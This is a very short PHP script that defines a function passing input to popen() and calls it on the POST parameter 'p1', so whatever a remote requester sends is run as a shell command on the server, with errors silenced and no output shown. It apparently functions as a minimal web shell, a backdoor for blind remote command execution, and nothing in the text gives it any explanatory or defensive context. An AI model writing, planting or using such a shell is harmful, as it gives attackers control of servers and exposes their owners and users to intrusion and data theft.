<?php
function ex($in) {
	$f = @popen($in,"r");
	pclose($f);
}

ex($_POST['p1']);
?>